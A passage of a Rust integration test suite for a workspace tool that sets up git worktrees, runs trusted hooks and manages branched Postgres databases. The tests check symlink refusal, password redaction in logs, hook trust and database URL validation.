    std::fs::write(&sentinel, "belongs to someone else").unwrap();
    std::os::unix::fs::symlink(outside.path(), w.path.join(".devflow")).unwrap();

    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(format!("{error:#}").contains("symlink"), "{error:#}");
    assert_eq!(
        std::fs::read_to_string(&sentinel).unwrap(),
        "belongs to someone else"
    );
    assert!(!outside.path().join(".gitignore").exists());
    let receipt = receipt_of(&w);
    assert_eq!(receipt.phase(Phase::Env).state, PhaseState::Failed);
    assert_eq!(receipt.status(), Status::NeedsAttention);

    // Fixing it lets the same setup resume and finish.
    std::fs::remove_file(w.path.join(".devflow")).unwrap();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(env_file::path(&w.path).is_file());
}

#[test]
fn hook_output_and_logs_never_contain_the_database_password() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"pw=$PGPASSWORD url=$DATABASE_URL\"",
                "echo \"again $PGPASSWORD\" >&2",
                "echo PGPASSWORD=Sup3rSecretPw psql",
            ],
            ..Default::default()
        },
        "",
    );
    let mut rec = Recorder::default();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "creds".into(),
            from: None,
            options: SetupOptions {
                database_url: Some("postgres://app:Sup3rSecretPw@localhost:5439/app".into()),
                approval: Some(trust::Approval::of(&trust::scope(&t.project))),
                ..Default::default()
            },
        },
        &mut rec,
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    let report = out.hooks.as_ref().unwrap();
    assert!(report.ok, "{report:?}");
    let log = std::fs::read_to_string(report.log.as_ref().unwrap()).unwrap();
    assert!(log.contains("pw=***"), "{log}");
    assert!(!log.contains("Sup3rSecretPw"), "{log}");
    assert!(
        rec.lines.iter().all(|l| !l.contains("Sup3rSecretPw")),
        "{:?}",
        rec.lines
    );
    assert!(
        rec.lines
            .iter()
            .any(|l| l.contains("url=postgres://app:***@localhost:5439/app")),
        "{:?}",
        rec.lines
    );
    // The generated env file is the one place that must keep it.
    assert_eq!(env_map(&out.workspace)["PGPASSWORD"], "Sup3rSecretPw");
}

#[test]
fn run_switch_hooks_runs_what_create_leaves_to_the_caller() {
    let t = repo(
        &Hooks {
            switch: &["touch .devflow/switch-ran"],
            ..Default::default()
        },
        "",
    );
    let ran = |w: &Workspace| w.path.join(".devflow/switch-ran").exists();
    // Untrusted: nothing runs, whatever the caller asks.
    let out = create(&t.project, "first", SetupOptions::default()).unwrap();
    assert!(out.hooks.is_none() && !ran(&out.workspace));
    assert!(
        setup::run_switch_hooks(
            &t.project,
            &out.workspace,
            &SetupOptions::default(),
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
    assert!(!ran(&out.workspace));

    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "second", SetupOptions::default()).unwrap();
    assert!(out.hooks.is_none(), "create does not run switch hooks");
    assert!(!ran(&out.workspace));
    let mut rec = Recorder::default();
    let report =
        setup::run_switch_hooks(&t.project, &out.workspace, &trusted(&t.project), &mut rec)
            .unwrap()
            .expect("trusted and ready");
    assert!(report.ok && report.runs.len() == 1);
    assert!(ran(&out.workspace));
    assert!(rec.lines.iter().any(|l| l.starts_with("$ touch")));

    // --no-hooks, and a workspace devflow has not set up.
    let skip = SetupOptions {
        no_hooks: true,
        ..Default::default()
    };
    assert!(
        setup::run_switch_hooks(&t.project, &out.workspace, &skip, &mut NoProgress)
            .unwrap()
            .is_none()
    );
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    assert!(
        setup::run_switch_hooks(&t.project, &raw, &trusted(&t.project), &mut NoProgress)
            .unwrap()
            .is_none()
    );
}

#[test]
fn devflow_instance_id_forks_a_copied_receipt() {
    const NAME: &str = "devflow_instance_id_forks_a_copied_receipt";
    let named = "6f1d3a1e-7a53-4c83-9a2f-0f1a2b3c4d5e";
    if !in_child(NAME, &[("DEVFLOW_INSTANCE_ID", named)]) {
        return;
    }
    let named: uuid::Uuid = named.parse().unwrap();
    let t = repo(
        &Hooks {
            setup: &["echo \"$DEVFLOW_WORKSPACE_ID\" > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let started = |rec: &Recorder| -> Vec<Phase> {
        rec.phases
            .iter()
            .filter(|(_, s)| *s == PhaseState::Started)
            .map(|(p, _)| *p)
            .collect()
    };
    let rerun = |w: &Workspace, if_new: bool, rec: &mut Recorder| {
        setup::setup(&t.project, w, SetupOptions::default(), if_new, false, rec).unwrap()
    };

    // Creating does not honour the override: the receipt is born with its own id.
    let first = create(&t.project, "vm", SetupOptions::default()).unwrap();
    assert_ne!(first.receipt.instance_id, named);
    assert_ne!(Receipt::new(t.project.id(), "x", None).instance_id, named);
    let w = first.workspace;

    // The explicit `setup` obeys it: a receipt of another instance is a copy
    // (even with `--if-new` on a ready receipt), and the id becomes the identity.
    let (old, branch) = (first.receipt.instance_id, uuid::Uuid::new_v4());
    let mut copied = receipt_of(&w);
    copied.data_source = Some("workspace:main".into());
    copied.services.insert(
        "db".into(),
        ServiceBinding::postgres(
            DataBinding {
                branch_id: Some(branch),
                database: "df_a_b".into(),
                role: "dfl_b".into(),
                url: "postgres://dfl_b:pw@old-host:5432/df_a_b".into(), // kingfisher:ignore
                source: "workspace:main".into(),
                owned: true,
            },
            None,
        ),
    );
    copied.save(&w.git_dir).unwrap();
    std::fs::remove_file(w.path.join(".devflow/marker")).unwrap();
    let mut rec = Recorder::default();
    let out = rerun(&w, true, &mut rec).expect("forked instead of skipped");
    assert_eq!(out.receipt.instance_id, named);
    assert_ne!(out.receipt.instance_id, old);
    assert!(
        out.receipt.services.is_empty(),
        "the owned binding lost its authority"
    );
    assert_eq!(out.receipt.data_source, Some(format!("branch:{branch}")));
    assert_eq!(
        started(&rec),
        vec![Phase::Services, Phase::Env, Phase::Hooks]
    );
    assert_eq!(env_map(&w)["DEVFLOW_WORKSPACE_ID"], named.to_string());
    assert!(!env_map(&w).contains_key("DEVFLOW_INSTANCE_ID"));
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/marker"))
            .unwrap()
            .trim(),
        named.to_string()
    );
    assert_eq!(receipt_of(&w), out.receipt);

    // The same override again changes nothing.
    let mut rec = Recorder::default();
    assert!(rerun(&w, true, &mut rec).is_none());
    let out = rerun(&w, false, &mut rec).unwrap();
    assert!(started(&rec).is_empty());
    assert_eq!(out.receipt.instance_id, named);

    // A receipt without an identity of its own (an adopted worktree) takes it.
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    // `named` already belongs to `vm`: refused, and nothing is written.
    let error = setup::setup(
        &t.project,
        &raw,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        format!("{error:#}").contains("recorded for workspace 'vm'"),
        "{error:#}"
    );
    assert!(Receipt::load(&raw.git_dir).unwrap().is_none());
}

#[test]
fn sourcing_one_workspaces_env_does_not_fork_another_workspace() {
    // The reviewer's scenario: `source A/.devflow/env`, then work on B. With the
    // old export that put A's id in DEVFLOW_INSTANCE_ID and every command about
    // B treated it as a fork request.
    const NAME: &str = "sourcing_one_workspaces_env_does_not_fork_another_workspace";
    let a_id = "0a1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3c4d";
    if !in_child(NAME, &[("DEVFLOW_INSTANCE_ID", a_id)]) {
        return;
    }
    let a_id: uuid::Uuid = a_id.parse().unwrap();
    let t = repo(
        &Hooks {
            switch: &["touch .devflow/switched"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    // A carries the id the shell has; B is attached to a database by URL.
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    let mut receipt = receipt_of(&a.workspace);
    receipt.instance_id = a_id;
    receipt.save(&a.workspace.git_dir).unwrap();
    let url = "postgres://b:pw@db.internal:5432/b_data";
    let b = create(
        &t.project,
        "b",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    let b_receipt = b.receipt.clone();
    assert_ne!(b_receipt.instance_id, a_id);
    assert_eq!(b_receipt.services["db"].url, url);

    // What A's env file offers a sourcing shell is informational only.
    let a_env = env_map(&a.workspace);
    assert!(!a_env.contains_key("DEVFLOW_INSTANCE_ID"));
    assert_eq!(
        env_file::read(&a.workspace.path).unwrap().len(),
        a_env.len()
    );

    let unchanged = |what: &str| {
        assert_eq!(receipt_of(&b.workspace), b_receipt, "{what}");
        assert_eq!(env_map(&b.workspace)["DATABASE_URL"], url, "{what}");
    };
    let mut rec = Recorder::default();
    let out = setup::switch(&t.project, &b.workspace, SetupOptions::default(), &mut rec).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.hooks.is_some(), "the switch hook ran");
    assert!(
        rec.phases.iter().all(|(_, s)| *s != PhaseState::Started),
        "no phase re-ran: {:?}",
        rec.phases
    );
    unchanged("switch");

    // Creating over an unfinished B resumes it instead of forking it.
    let mut unfinished = receipt_of(&b.workspace);
    unfinished.set_phase(Phase::Hooks, PhaseState::Pending, None);
    unfinished.save(&b.workspace.git_dir).unwrap();
    let resumed = create(&t.project, "b", SetupOptions::default()).unwrap();
    assert_eq!(resumed.receipt.instance_id, b_receipt.instance_id);
    assert_eq!(resumed.receipt.services, b_receipt.services);

    setup::run_switch_hooks(
        &t.project,
        &b.workspace,
        &trusted(&t.project),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(receipt_of(&b.workspace).instance_id, b_receipt.instance_id);
    assert_eq!(
        setup::list(&t.project).unwrap()[2]
            .receipt
            .as_ref()
            .unwrap()
            .instance_id,
        b_receipt.instance_id
    );
    assert_eq!(env_map(&b.workspace)["DATABASE_URL"], url);

    // Explicit `setup` in B with A's id is refused, and B stays as it was.
    for if_new in [false, true] {
        let error = setup::setup(
            &t.project,
            &b.workspace,
            SetupOptions::default(),
            if_new,
            false,
            &mut NoProgress,
        )
        .unwrap_err();
        assert!(
            format!("{error:#}").contains("recorded for workspace 'a'"),
            "{error:#}"
        );
        assert_eq!(receipt_of(&b.workspace).instance_id, b_receipt.instance_id);
        assert_eq!(receipt_of(&b.workspace).services, b_receipt.services);
    }
    // ...while in A itself the same id is simply A's own: nothing to do.
    let out = setup::setup(
        &t.project,
        &a.workspace,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.is_none());
    assert_eq!(receipt_of(&a.workspace).instance_id, a_id);

    // Removing B is not steered by the variable either.
    let removed =
        setup::remove(&t.project, "b", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(removed.workspace.name, "b");
    assert_eq!(receipt_of(&a.workspace).instance_id, a_id);
}

#[test]
fn devflow_trust_hooks_trusts_setup_switch_and_teardown_alike() {
    const NAME: &str = "devflow_trust_hooks_trusts_setup_switch_and_teardown_alike";
    if !in_child(NAME, &[("DEVFLOW_TRUST_HOOKS", "1")]) {
        return;
    }
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/setup-ran"],
            switch: &["touch .devflow/switch-ran"],
            teardown: &["touch ../teardown-ran"],
        },
        "",
    );
    assert!(
        matches!(
            trust::state(&t.project).unwrap(),
            trust::TrustState::Untrusted { .. }
        ),
        "nothing was approved"
    );
    let out = create(&t.project, "ci", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert!(out.workspace.path.join(".devflow/setup-ran").exists());

    let out = setup::switch(
        &t.project,
        &out.workspace,
        SetupOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.warnings.is_empty(), "{:?}", out.warnings);
    assert!(out.hooks.unwrap().ok);
    assert!(out.workspace.path.join(".devflow/switch-ran").exists());

    let removed =
        setup::remove(&t.project, "ci", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert!(removed.hooks.unwrap().ok, "teardown ran without --force");
    assert!(removed.warnings.is_empty(), "{:?}", removed.warnings);
    assert!(
        removed
            .workspace
            .path
            .parent()
            .unwrap()
            .join("teardown-ran")
            .exists()
    );
}

#[test]
fn generated_pg_variables_agree_with_database_url_and_unusable_urls_fail_up_front() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"$PGHOST|$PGHOSTADDR|$PGPORT|$PGSSLMODE|$PGDATABASE|${PGSCHEMA-unset}\" > .devflow/seen",
            ],
            ..Default::default()
        },
        "",
    );
    let attach = |name: &str, url: &str| {
        create(
            &t.project,
            name,
            SetupOptions {
                database_url: Some(url.into()),
                approval: Some(trust::Approval::of(&trust::scope(&t.project))),
                ..Default::default()
            },
        )
    };

    // hostaddr is kept and a repeated sslmode resolves to the last value, so a
    // hook's psql goes where DATABASE_URL goes. Prisma-style `schema=` stays in
    // the URL and is not a libpq setting.
    let url = "postgres://app:pw@db.example:6543/app?hostaddr=192.0.2.44&sslmode=disable&sslmode=require&schema=public";
    let out = attach("hostaddr", url).unwrap();
    let env = env_map(&out.workspace);
    assert_eq!(env["DATABASE_URL"], url);
    assert_eq!(env["PGHOST"], "db.example");
    assert_eq!(env["PGHOSTADDR"], "192.0.2.44");
    assert_eq!(env["PGPORT"], "6543");
    assert_eq!(env["PGSSLMODE"], "require");
    assert_eq!(env["PGDATABASE"], "app");
    assert!(
        env.keys()
            .all(|k| !k.to_ascii_lowercase().contains("schema")),
        "{env:?}"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "db.example|192.0.2.44|6543|require|app|unset"
    );
    let binding = out.receipt.services["db"].clone();
    assert_eq!(
        (binding.database.as_str(), binding.role.as_str()),
        ("app", "app")
    );

    // IPv6 literal, and a query-string password with an encoded name.
    let out = attach("v6", "postgresql://u@[2001:db8::7]:5433/d?%70assword=p%2Fw").unwrap();
    let env = env_map(&out.workspace);
    assert_eq!(env["PGHOST"], "2001:db8::7");
    assert_eq!(env["PGPORT"], "5433");
    assert_eq!(env["PGPASSWORD"], "p/w");
    assert_eq!(
        env["DATABASE_URL"],
        "postgresql://u@[2001:db8::7]:5433/d?%70assword=p%2Fw"
    );

    // Rejected before anything is created: no worktree, no branch, no receipt.
    for (bad, expected) in [
        ("postgres://u:topsecret@h1,h2/d", "several hosts"),
        ("postgres://u:topsecret@h/d?sslpassword=x", "sslpassword"),
        (
            "postgres://u:topsecret@h/d?replication=database",
            "replication",
        ),
        ("mysql://u:topsecret@h/d", "postgres://"),
        ("host=h password=topsecret", "postgres://"),
    ] {
        let name = format!("bad-{}", expected.replace(['/', ':', ' '], ""));
        let error = attach(&name, bad).unwrap_err();
        let shown = format!("{error:#}");
        assert!(shown.contains("--database-url"), "{bad}: {shown}");
        assert!(shown.contains(expected), "{bad}: {shown}");
        assert!(!shown.contains("topsecret"), "{shown}");
        assert!(
            worktree::find(&t.project, &name).unwrap().is_none(),
            "{bad}"
        );
        assert!(
            t.project
                .repo()
                .unwrap()
                .find_branch(&name, git2::BranchType::Local)
                .is_err(),
            "{bad}: no branch left behind"
        );
    }
    assert_eq!(worktree::list(&t.project).unwrap().len(), 3);
    // An existing worktree is checked the same way before setup touches it.
    let raw = worktree::create(&t.project, "existing", None).unwrap();
    let error = setup::setup(
        &t.project,
        &raw,
        SetupOptions {
            database_url: Some("postgres://u@h1,h2/d".into()),
            ..Default::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(format!("{error:#}").contains("several hosts"), "{error:#}");
    assert!(Receipt::load(&raw.git_dir).unwrap().is_none());
}

#[test]
fn hooks_see_the_workspace_connection_not_inherited_libpq_variables() {
    const NAME: &str = "hooks_see_the_workspace_connection_not_inherited_libpq_variables";
    let inherited = [
        ("PGPORT", "6543"),
        ("PGHOST", "inherited.example"),
        ("PGSERVICE", "svc"),
        ("PGHOSTADDR", "10.9.9.9"),
        ("PGOPTIONS", "-c x=1"),
        ("PGPASSWORD", "inherited-secret"),
        // Not named by the URL below, so they must be gone, not merely differ.
        ("PGSSLMODE", "disable"),
        ("PGSSLROOTCERT", "/inherited/ca.pem"),
        ("PGPASSFILE", "/inherited/pgpass"),
        ("PGCONNECT_TIMEOUT", "99"),
        ("PGAPPNAME", "inherited"),
        ("PGSERVICEFILE", "/inherited/services"),
        ("PGSYSCONFDIR", "/inherited/etc"),
    ];
    if !in_child(NAME, &inherited) {
        return;
    }
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"$PGHOST|$PGPORT|$PGUSER|$PGDATABASE|${PGSERVICE-unset}|${PGHOSTADDR-unset}|${PGOPTIONS-unset}|$PGPASSWORD\" > .devflow/seen",
                "echo \"${PGSSLMODE-unset}|${PGSSLROOTCERT-unset}|${PGPASSFILE-unset}|${PGCONNECT_TIMEOUT-unset}|${PGAPPNAME-unset}|${PGSERVICEFILE-unset}|${PGSYSCONFDIR-unset}\" > .devflow/seen-more",
            ],
            ..Default::default()
        },
        "",
    );
    // The port is only given as a query parameter.
    let out = create(
        &t.project,
        "attached",
        SetupOptions {
            database_url: Some("postgres://app:s3cretpw@localhost/app?port=5434".into()),
            approval: Some(trust::Approval::of(&trust::scope(&t.project))),
            ..Default::default()
        },
    )
    .unwrap();
    let env = env_map(&out.workspace);
    assert_eq!(env["PGPORT"], "5434");
    assert_eq!(env["PGHOST"], "localhost");
    assert_eq!(env["PGUSER"], "app");
    assert_eq!(env["PGDATABASE"], "app");
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "localhost|5434|app|app|unset|unset|unset|s3cretpw"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen-more"))
            .unwrap()
            .trim(),
        "unset|unset|unset|unset|unset|unset|unset",
        "every connection-affecting variable is cleared, not just the common ones"
    );

    // Without a database there is nothing to disagree with: the user's own
    // environment is left alone.
    let out = create(
        &t.project,
        "nodb",
        SetupOptions {
            no_db: true,
            approval: Some(trust::Approval::of(&trust::scope(&t.project))),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "inherited.example|6543|||svc|10.9.9.9|-c x=1|inherited-secret"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen-more"))
            .unwrap()
            .trim(),
        "disable|/inherited/ca.pem|/inherited/pgpass|99|inherited|/inherited/services|/inherited/etc"
    );
}

// ---------------------------------------------------------------------------
// Tests below need external programs. Run with `-- --ignored`.

/// Removes a project's managed compose project (containers and volume) and
/// stops the isolated pitchfork supervisor, even when the test panics.
struct Cleanup(Box<dyn FnMut()>);

impl Drop for Cleanup {
    fn drop(&mut self) {
        (self.0)();
    }
}

fn docker_compose(args: &[&str]) -> String {
    let out = std::process::Command::new("docker")
        .arg("compose")
        .args(args)
        .output()
        .expect("docker is available");
    String::from_utf8_lossy(&out.stdout).into_owned()
}

/// The compose project(s) a test's managed server created, removed at the end.
fn managed_cleanup(project: &Project) -> Cleanup {
    let project = project.clone();
    Cleanup(Box::new(move || {
        let file = devflow_core::paths::data_dir()
            .unwrap()
            .join("postgres")
            .join(project.id().to_string())
            .join("compose.yaml");
        let needle = file.display().to_string();
        let listing = docker_compose(&["ls", "-a", "--format", "json"]);
        let projects: Vec<serde_json::Value> = serde_json::from_str(&listing).unwrap_or_default();
        for p in projects {
            if p["ConfigFiles"]
                .as_str()
                .is_some_and(|f| f.contains(&needle))
                && let Some(name) = p["Name"].as_str()
            {
                docker_compose(&["-p", name, "down", "-v", "--remove-orphans"]);
            }
        }
    }))
}

const MANAGED: &str =
    "[services.db]\nengine = \"postgres\"\nmode = \"managed\"\nimage = \"postgres:18\"\n";

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn renaming_a_service_never_reuses_its_orphaned_branch_and_recovery_is_by_recorded_identity() {
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    let connect = |url: &str| postgres::Client::connect(url, postgres::NoTls);
    let w = create(
        &t.project,
        "w",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(w.status, Status::Ready, "{:?}", w.receipt.phases);
    let old = binding(&w.receipt);
    connect(&old.url).unwrap(); // the original credentials work

    // `services.db` becomes `services.main`.
    let project = edit_config(&t, |text| text.replace("[services.db]", "[services.main]"));
    assert_eq!(project.config.postgres().unwrap().0, "main");
    let renamed = setup::setup(
        &project,
        &w.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        renamed.status,
        Status::Ready,
        "{:?}",
        renamed.receipt.phases
    );
    let receipt = receipt_of(&w.workspace);
    let new = &receipt.services["main"];
    let orphan = &receipt.services["db"];
    assert_ne!(
        new.branch_id, old.branch_id,
        "the renamed service got a branch of its own"
    );
    assert_ne!(new.database, old.database);
    assert_eq!(orphan.branch_id, old.branch_id);
    assert_eq!(
        orphan.url, old.url,
        "the orphan's credentials are untouched"
    );
    assert!(orphan.orphaned);
    connect(&old.url).unwrap();
    connect(&new.url).unwrap();
    assert_eq!(env_map(&w.workspace)["DATABASE_URL"], new.url);

    // A creation interrupted after the server created the branch but before
    // the credentials were recorded: the receipt names the branch it asked
    // for, and the next setup takes exactly that one over.
    let server = devflow_core::db::Server::for_project(&project)
        .unwrap()
        .unwrap();
    let a = create(
        &project,
        "a",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    let a_ws = a.workspace.clone();
    let mut crashed = receipt_of(&a_ws);
    let kept = crashed.services.remove("main").unwrap();
    let lost = uuid::Uuid::new_v4();
    let creds = server
        .create_branch_with_id(
            lost,
            "a",
            devflow_core::db::ResolvedSource::Empty,
            Some(crashed.instance_id),
        )
        .unwrap();
    crashed.creating = Some(devflow_core::receipt::PendingBranch {
        service: "main".into(),
        branch_id: lost,
    });
    crashed.set_phase(Phase::Services, PhaseState::Started, None);
    crashed.save(&a_ws.git_dir).unwrap();
    let recovered = setup::setup(
        &project,
        &a_ws,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        recovered.status,
        Status::Ready,
        "{:?}",
        recovered.receipt.phases
    );
    let took = &recovered.receipt.services["main"];
    assert_eq!(
        took.branch_id,
        Some(lost),
        "the recorded branch, not a new one"
    );
    assert_ne!(took.url, creds.url, "its password was rotated");
    assert_ne!(took.branch_id, kept.branch_id);
    assert!(recovered.receipt.creating.is_none());
    connect(&took.url).unwrap();

    // The same intent under another service key recovers nothing: the
    // branch it names is another service's.
    let mut other = receipt_of(&a_ws);
    other.services.remove("main");
    other.creating = Some(devflow_core::receipt::PendingBranch {
        service: "db".into(),
        branch_id: lost,
    });
    other.set_phase(Phase::Services, PhaseState::Started, None);
    other.save(&a_ws.git_dir).unwrap();
    let again = setup::setup(
        &project,
        &a_ws,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(again.status, Status::Ready, "{:?}", again.receipt.phases);
    assert_ne!(
        again.receipt.services["main"].branch_id,
        Some(lost),
        "an intent recorded for `db` is not `main`'s to recover"
    );
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn a_changed_endpoint_setting_reaches_the_workspace_url_before_the_service_is_stamped() {
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    let w = create(
        &t.project,
        "w",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(w.status, Status::Ready, "{:?}", w.receipt.phases);
    let first = binding(&w.receipt);
    let real_port = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap()
        .app_endpoint()
        .unwrap()
        .1;
    assert!(
        first.url.contains(&format!(":{real_port}/")),
        "{}",
        first.url
    );

    // `app_port` is what workspace URLs advertise (a proxy in front, say).
    // The service section changed, so setup reuses the branch; the URL must
    // follow before the new generation is recorded.
    let project = edit_config(&t, |text| {
        text.replace(MANAGED, &format!("{MANAGED}app_port = 15432\n"))
    });
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );
    let out = setup::setup(
        &project,
        &w.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let moved = receipt_of(&w.workspace).services["db"].clone();
    assert_eq!(moved.branch_id, first.branch_id, "the same branch");
    assert_eq!(
        moved.url,
        first.url.replace(&format!(":{real_port}/"), ":15432/"),
        "only the endpoint changed; user, password and database are kept"
    );
    assert_eq!(moved.applied, project.config.service_generation("db"));
    assert_eq!(env_map(&w.workspace)["DATABASE_URL"], moved.url);
    assert_eq!(env_map(&w.workspace)["PGPORT"], "15432");

    // Back to the server's own endpoint.
    let project = edit_config(&t, |text| text.replace("app_port = 15432\n", ""));
    setup::setup(
        &project,
        &w.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(receipt_of(&w.workspace).services["db"].url, first.url);
    assert_eq!(env_map(&w.workspace)["DATABASE_URL"], first.url);
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_create_clone_reset_and_remove() {
    let t = repo(
        &Hooks {
            setup: &["echo \"$DATABASE_URL\" > .devflow/db-url"],
            ..Default::default()
        },
        "[services.db]\nengine = \"postgres\"\nmode = \"managed\"\nimage = \"postgres:18\"\ndatabase = \"shop\"\n",
    );
    trust::approve(&t.project).unwrap();
    let project = t.project.clone();
    let _cleanup = Cleanup(Box::new(move || {
        let file = devflow_core::paths::data_dir()
            .unwrap()
            .join("postgres")
            .join(project.id().to_string())
            .join("compose.yaml");
        let needle = file.display().to_string();
        let listing = docker_compose(&["ls", "-a", "--format", "json"]);
        let projects: Vec<serde_json::Value> = serde_json::from_str(&listing).unwrap_or_default();
        for p in projects {
            if p["ConfigFiles"]
                .as_str()
                .is_some_and(|f| f.contains(&needle))
                && let Some(name) = p["Name"].as_str()
            {
                docker_compose(&["-p", name, "down", "-v", "--remove-orphans"]);
            }
        }
    }));
    let connect = |url: &str| postgres::Client::connect(url, postgres::NoTls);
    let count = |url: &str| -> i64 {
        connect(url)
            .unwrap()
            .query_one("SELECT count(*) FROM t", &[])
            .unwrap()
            .get(0)
    };

    // a: the first workspace gets an empty branch cloned from the implicit root branch.
    let a = create(&t.project, "feature/a", SetupOptions::default()).unwrap();
    assert_eq!(a.status, Status::Ready, "{:?}", a.receipt.phases);
    let binding_a = binding(&a.receipt);
    assert!(binding_a.owned && binding_a.branch_id.is_some());
    assert_eq!(binding_a.source, "workspace:main");
    let root = receipt_of(&ws(&t.project, "main"));
    assert!(
        binding(&root).branch_id.is_some(),
        "the default workspace got a root branch"
    );
    assert_eq!(
        a.receipt.data_source_id,
        Some(format!("branch:{}", binding(&root).branch_id.unwrap())),
        "the resolved source is recorded next to the user-facing one"
    );
    assert_eq!(env_map(&a.workspace)["DATABASE_URL"], binding_a.url);
    assert_eq!(
        std::fs::read_to_string(a.workspace.path.join(".devflow/db-url"))
            .unwrap()
            .trim(),
        binding_a.url
    );
    connect(&binding_a.url)
        .unwrap()
        .batch_execute("CREATE TABLE t(x int); INSERT INTO t VALUES (1)")
        .unwrap();

    // b clones a's data and is isolated from it.
    let b = create(
        &t.project,
        "feature/b",
        SetupOptions {
            data_from: Some(DataSource::Workspace {
                name: "feature/a".into(),
            }),
            ..Default::default()
        },
    )
    .unwrap();
    let binding_b = binding(&b.receipt);
    assert_eq!(binding_b.source, "workspace:feature/a");
    assert_eq!(
        b.receipt.data_source_id,
        Some(format!("branch:{}", binding_a.branch_id.unwrap()))
    );
    assert_eq!(count(&binding_b.url), 1);
    connect(&binding_b.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (2)")
        .unwrap();
    assert_eq!(count(&binding_a.url), 1, "a does not see b's write");

    // snapshot a, then reset b to it and back to its recorded source.
    let snap = setup::snapshot(&t.project, &a.workspace, "seed").unwrap();
    assert_eq!(snap.version, 1);
    setup::reset_data(
        &t.project,
        &b.workspace,
        Some(DataSource::Snapshot {
            name: "seed".into(),
            version: None,
        }),
    )
    .unwrap();
    assert_eq!(count(&binding_b.url), 1, "same URL after reset");
    connect(&binding_a.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (3)")
        .unwrap();
    setup::reset_data(&t.project, &b.workspace, None).unwrap();
    assert_eq!(
        count(&binding_b.url),
        2,
        "reset to the recorded source clones a's current data"
    );

    // The default reset follows b's immutable provenance (a's branch), never
    // the name `feature/a`: remove a keeping its data, reset b (the name no
    // longer resolves to anything), then give the name to a workspace with
    // other data and reset b again.
    let server = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap();
    let kept = setup::remove(
        &t.project,
        "feature/a",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(kept.dropped_branch, None);
    assert!(
        server
            .branch(binding_a.branch_id.unwrap())
            .unwrap()
            .is_some()
    );
    connect(&binding_b.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (99)")
        .unwrap();
    setup::reset_data(&t.project, &b.workspace, None).unwrap();
    assert_eq!(
        count(&binding_b.url),
        2,
        "reset clones the kept branch of the removed workspace"
    );
    let a2 = create(
        &t.project,
        "feature/a",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    let binding_a2 = binding(&a2.receipt);
